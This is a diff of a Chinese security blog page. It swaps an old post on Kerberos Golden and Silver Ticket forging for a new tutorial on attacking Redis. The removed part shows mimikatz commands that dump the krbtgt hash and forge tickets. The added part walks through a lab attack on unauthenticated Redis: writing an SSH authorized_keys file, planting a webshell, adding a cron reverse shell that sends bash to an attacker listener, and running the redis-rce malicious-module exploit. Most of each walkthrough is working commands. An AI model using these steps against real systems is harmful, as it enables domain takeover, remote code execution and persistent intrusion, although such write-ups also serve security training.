@@ -24,7 +24,7 @@
 
   
 
-  <title>黄金票据 &amp;&amp; 白银票据 | WsyKer&#39;s Blog</title>
+  <title>redis攻防 | WsyKer&#39;s Blog</title>
 
   
 
@@ -98,20 +98,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">黄金票据 &amp;&amp; 白银票据</h1>
+          <h1 class="title-wrap">redis攻防</h1>
           <h2 class="title-sub-wrap">
             <strong>WsyKer</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-06-24T01:36:32.000Z" itemprop="datePublished">2022-06-24</time>
+            <time  class="article-date" datetime="2022-07-04T05:08:01.000Z" itemprop="datePublished">2022-07-04</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">📒 内网安全</a></li>
+    <li><a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">📒 中间件安全</a></li>
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">🏷️ 内网安全</a></li>
+    <li><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">🏷️ 中间件安全</a></li>
   
 </ul>
         </div>
@@ -135,131 +135,94 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h2 id="一、GoldenTicket介绍"><a href="#一、GoldenTicket介绍" class="headerlink" title="一、GoldenTicket介绍"></a>一、GoldenTicket介绍</h2><p>黄金票据（GoldenTicket）是在Kerberos认证中的AS-REP阶段，由于返回的TGT认购权证是由krbtgt用户的密码Hash加密的，因此如果我们拥有krbtgt的Hash就可以自己制作一个TGT认购权证，只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限</p>
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/1.png" alt="1"></p>
-<h2 id="二、GoldenTicket利用"><a href="#二、GoldenTicket利用" class="headerlink" title="二、GoldenTicket利用"></a>二、GoldenTicket利用</h2><h3 id="环境介绍："><a href="#环境介绍：" class="headerlink" title="环境介绍："></a>环境介绍：</h3><p>域控：Windows Server 2008 &amp;&amp; 192.168.5.2</p>
-<p>域用户：Windows7 &amp;&amp; 192.168.5.3</p>
-<h3 id="制作条件："><a href="#制作条件：" class="headerlink" title="制作条件："></a>制作条件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域的FQDN</span><br><span class="line">2、域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value]</span><br><span class="line">3、域的KRBTGT账户NTLM密码哈希</span><br><span class="line">4、伪造用户名[可以是任意的，我这儿是bdministrator]</span><br></pre></td></tr></table></figure>
+        <h1 id="一、Redis搭建"><a href="#一、Redis搭建" class="headerlink" title="一、Redis搭建"></a>一、Redis搭建</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>简单来说 redis 就是一个数据库，不过与传统数据库不同的是 redis 的数据是存在内存中的，所以读写速度非常快，因此 redis 被广泛应用于缓存方向。另外，redis 也经常用来做分布式锁。redis 提供了多种数据类型来支持不同的业务场景。除此之外，redis 支持事务 、持久化、LUA脚本、LRU驱动事件、多种集群方案。</p>
+<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>靶机地址：192.168.43.104</p>
+<p>攻击者地址：192.168.43.217</p>
+<p>为了方便这里的攻击环境和靶机环境使用的都是kali，使用以下命令进行安装：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//download.redis.io/releases/redis-4.0.11.tar.gz</span></span><br><span class="line">tar -zxvf redis-<span class="number">4.0</span><span class="number">.11</span>.tar.gz</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
 
-<h3 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h3><p>当攻击者掌握了域控制器的权限，或者以某种方式获取了Krbtgt账户密码的哈希，那么就可以在任意一台机器，甚至是本机制作黄金票据了</p>
-<ol>
-<li>常用命令</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">![3](C:\Users\23528\Desktop\img\ticket\3.png)1、获取域名：net time /domain</span><br><span class="line">2、获取域sid：whoami /all</span><br><span class="line">3、查看域管理员：net group &quot;domain admins&quot; /domain</span><br><span class="line">4、查看票据：kerberos::list</span><br><span class="line">5、清空票据：kerberos::purge</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/1.png" alt="1"></p>
+<p>redis基本操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开启服务：./redis-server</span><br><span class="line">启动：./redis-server start</span><br><span class="line">停止：./redis-server stop</span><br><span class="line">重启：./redis-server restart</span><br><span class="line">查看是否启动：./redis-cli</span><br><span class="line">关闭redis：./redis-cli shutdown</span><br><span class="line">禁止保护模式：CONFIG SET <span class="keyword">protected</span>-mode no</span><br><span class="line">其他命令：https:<span class="comment">//www.cnblogs.com/kongzhongqijing/p/6867960.html</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/2.png" alt="2"></p>
-<ol start="2">
-<li>先在Windows Server 2008导出Krbtgt账号Hash</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;lsadump::dcsync /domain:test.local /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="二、未授权访问"><a href="#二、未授权访问" class="headerlink" title="二、未授权访问"></a>二、未授权访问</h1><p>Redis在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
+<p>这边使用kali进行连接：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h <span class="number">192.168</span><span class="number">.43</span><span class="number">.104</span> -p <span class="number">6379</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/3.png" alt="3"></p>
-<ol start="3">
-<li>得到Krbtgt Hash之后，进入Windows7开始伪造TGT，使用kerberos::golden功能生成金票golden.kiribi</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:bdministrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /ticket:bdministrator.kiribi</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">/admin：伪造的用户名[任意即可]</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/2.png" alt="2"></p>
+<h1 id="三、写入公钥"><a href="#三、写入公钥" class="headerlink" title="三、写入公钥"></a>三、写入公钥</h1><h2 id="手动写入"><a href="#手动写入" class="headerlink" title="手动写入"></a>手动写入</h2><p>使用攻击者生成公钥：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/4.png" alt="4"></p>
-<ol start="4">
-<li>通过kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt bdministrator.kiribi</span><br><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>
+<p>会让你输入名称以及密码，这里默认为空即可</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/3.png" alt="3"></p>
+<p>将公钥写入1.txt：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; echo -e <span class="string">&quot;\n\n&quot;</span>) &gt; <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/5.png" alt="5"></p>
-<ol start="5">
-<li>此时就可以通过dir成功访问域控的共享文件夹</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\主机名.域名\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/4.png" alt="4"></p>
+<p>写入公钥到redis：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="number">1.</span>txt | ./redis-cli -h <span class="number">192.168</span><span class="number">.43</span><span class="number">.104</span> -x set crack   <span class="comment">//windows下为type</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/6.png" alt="6"></p>
-<ol start="7">
-<li>在Windows7导出Krbtgt用户Hash</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/5.png" alt="5"></p>
+<p>写入后，按着以下步骤进行操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h <span class="number">192.168</span><span class="number">.43</span><span class="number">.104</span> -p <span class="number">6379</span>　　　　<span class="comment">//使用客户端登录靶机</span></span><br><span class="line">CONFIG GET dir								<span class="comment">//查看备份路径</span></span><br><span class="line">config set dir /root/.ssh　　　　　　		   <span class="comment">//更改存储公钥路径</span></span><br><span class="line">config set dbfilename authorized_keys　　   <span class="comment">//设置文件名称</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/7.png" alt="7"></p>
-<h2 id="三、SilverTickets介绍"><a href="#三、SilverTickets介绍" class="headerlink" title="三、SilverTickets介绍"></a>三、SilverTickets介绍</h2><p>白银票据不同于黄金票据，黄金票据发生在KRB_AS_REP认证阶段，是针对用户的，而白银票据（SilverTickets）发生在KRB_AP_REP认证阶段，是针对服务的，GoldenTicket利用Krbtgt Hash来伪造高权限的TGT，从而获取访问任何服务的权限，SilverTickets则是获取某个服务账号的Hash后，伪造服务票据ST，然后通过伪造的TGS，直接发送给Server访问指定的某个服务来进行攻击，此过程无需KDC，其权限低于Golden Ticket</p>
-<h2 id="四、SilverTickets利用"><a href="#四、SilverTickets利用" class="headerlink" title="四、SilverTickets利用"></a>四、SilverTickets利用</h2><h3 id="环境介绍：-1"><a href="#环境介绍：-1" class="headerlink" title="环境介绍："></a>环境介绍：</h3><p>域控：Windows Server 2008 &amp;&amp; 192.168.52.138</p>
-<p>域用户：Windows7 &amp;&amp; 192.168.52.143</p>
-<h3 id="制作条件：-1"><a href="#制作条件：-1" class="headerlink" title="制作条件："></a>制作条件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域名称</span><br><span class="line">2、域的SID值</span><br><span class="line">3、域的服务账户密码HASH</span><br><span class="line">4、需要伪造的用户名</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/6.png" alt="6"></p>
+<p>查看是否成功：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG GET dbfilename</span><br></pre></td></tr></table></figure>
 
-<h3 id="伪造-CIFS-服务权限："><a href="#伪造-CIFS-服务权限：" class="headerlink" title="伪造 CIFS 服务权限："></a>伪造 CIFS 服务权限：</h3><p>CIFS 服务主要用于windows主机之间来进行网络文件共享</p>
-<ol>
-<li>首先在Windows Server 2008使用获取服务账户的USERNAME、域SID、NTLM 哈希</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/7.png" alt="7"></p>
+<p>然后保存退出：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/8.png" alt="8"></p>
-<ol start="2">
-<li>获取以上信息之后，在Windows7伪造Silver Ticket票据</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /rc4:05df2fd1109e3d3b60f110965f6af128  /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
+<p>在攻击机上使用SSH免密登录靶机：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@<span class="number">192.168</span><span class="number">.43</span><span class="number">.104</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/9.png" alt="9"></p>
-<ol start="3">
-<li>伪造好后，就可以使用dir、type、at等命令访问共享目录了</li>
-</ol>
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/10.png" alt="10"></p>
-<h3 id="伪造-LDAP-服务权限："><a href="#伪造-LDAP-服务权限：" class="headerlink" title="伪造 LDAP 服务权限："></a>伪造 LDAP 服务权限：</h3><ol>
-<li>在Windows7使用dcsync命令导出krbtgt hash，以此来判断权限</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.local /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/8.png" alt="8"></p>
+<h2 id="工具写入"><a href="#工具写入" class="headerlink" title="工具写入"></a>工具写入</h2><p>暂时不写</p>
+<h1 id="四、写webshell"><a href="#四、写webshell" class="headerlink" title="四、写webshell"></a>四、写webshell</h1><p>这边模仿真实环境的环境，就直接开一个web服务：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/11.png" alt="11"></p>
-<ol start="2">
-<li>使用Windows Server 2008获取服务账号的 NTLM Hash，和上面cifs的一样</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:owa.god.org /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/9.png" alt="9"></p>
+<p>写shell需要的条件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">写shell的条件之一是需要知道web目录</span><br><span class="line">config set dir 有权限</span><br><span class="line">config set dbfilename 有权限</span><br><span class="line">使用默认apache目录：/<span class="keyword">var</span>/www/html/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/12.png" alt="12"></p>
-<ol start="3">
-<li>使用Windows7伪造Silver Ticket</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /service:LDAP /rc4:05df2fd1109e3d3b60f110965f6af128 /user:Administrator /ptt</span><br></pre></td></tr></table></figure>
+<p>第一步先连接，然后写入文件到web目录：&#x2F;var&#x2F;www&#x2F;html,设置redis本地数据库存在位置：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /<span class="keyword">var</span>/www/html</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/13.png" alt="13"></p>
-<ol start="4">
-<li>再次尝试导出krbtgt hash</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:owa.god.org /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/10.png" alt="10"></p>
+<p>第二步，设置写入webshell的文件名，这边我写个html就行</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/11.png" alt="11"></p>
+<p>第三步，写入webshell内容：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set webshell <span class="string">&quot;tset&quot;</span>    <span class="comment">//名为webshell的键</span></span><br><span class="line">set x <span class="string">&quot;\r\n\r\n&lt;a&gt;hello&lt;/a&gt;\r\n\r\n&quot;</span>    <span class="comment">//写入内容</span></span><br><span class="line">save	<span class="comment">//保存</span></span><br><span class="line">\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/14.png" alt="14"></p>
-<h3 id="可伪造的其他服务："><a href="#可伪造的其他服务：" class="headerlink" title="可伪造的其他服务："></a>可伪造的其他服务：</h3><table>
-<thead>
-<tr>
-<th>可伪造名称：</th>
-<th>服务名</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>WMI</td>
-<td>HOST、RPCSS</td>
-</tr>
-<tr>
-<td>Poershell Remoteing</td>
-<td>HOST、HTTP</td>
-</tr>
-<tr>
-<td>WinRM</td>
-<td>HOST、HTTP</td>
-</tr>
-<tr>
-<td>Scheduled Tasks</td>
-<td>HOST</td>
-</tr>
-<tr>
-<td>LDAP、DCSync</td>
-<td>LDAP</td>
-</tr>
-<tr>
-<td>Windows File Share(CIFS)</td>
-<td>CIFS</td>
-</tr>
-<tr>
-<td>Windows Remote ServerAdministration Tools</td>
-<td>RPCSS、LDAP、CIFS</td>
-</tr>
-</tbody></table>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/12.png" alt="12"></p>
+<h1 id="五、计划任务反弹shell"><a href="#五、计划任务反弹shell" class="headerlink" title="五、计划任务反弹shell"></a>五、计划任务反弹shell</h1><p>使用攻击机监听端口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8889</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/13.png" alt="13"></p>
+<p>写入任务计划：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.11/8889 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config set dir /<span class="keyword">var</span>/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/14.png" alt="14"></p>
+<p>shell反弹成功</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/15.png" alt="15"></p>
+<p>如果要删除键值只需要以下两步：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keys *	    <span class="comment">//查看全部键值</span></span><br><span class="line">del 键值    <span class="comment">//删除键值</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="六、主从复制"><a href="#六、主从复制" class="headerlink" title="六、主从复制"></a>六、主从复制</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p> 在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。  </p>
+<h2 id="通过脚本实现"><a href="#通过脚本实现" class="headerlink" title="通过脚本实现"></a>通过脚本实现</h2><p>第一步先从github下载 恶意.so文件，然后进行编译：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/n0b0dyCN/RedisModules-ExecuteCommand</span></span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/16.png" alt="16"></p>
+<p>第二步下载redis-rce脚本：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/Ridter/redis-rce.git</span></span><br><span class="line">cd redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/<span class="keyword">module</span>.so ./</span><br><span class="line">pip3 install -r requirements.txt </span><br></pre></td></tr></table></figure>
+
+<p>使用以下命令进行攻击：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/redis/17.png" alt="17"></p>
 
       </section>
 
@@ -267,28 +230,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2022/06/24/Relay/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">NTLM中继</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2022/06/23/ntds/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">ntds.dit导出</h2>
+        <a href="/2022/06/26/c2hide/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Cobalt Strike的隐藏技术</h2>
         </a>
       
       <div class="card-text--row">Older</div>
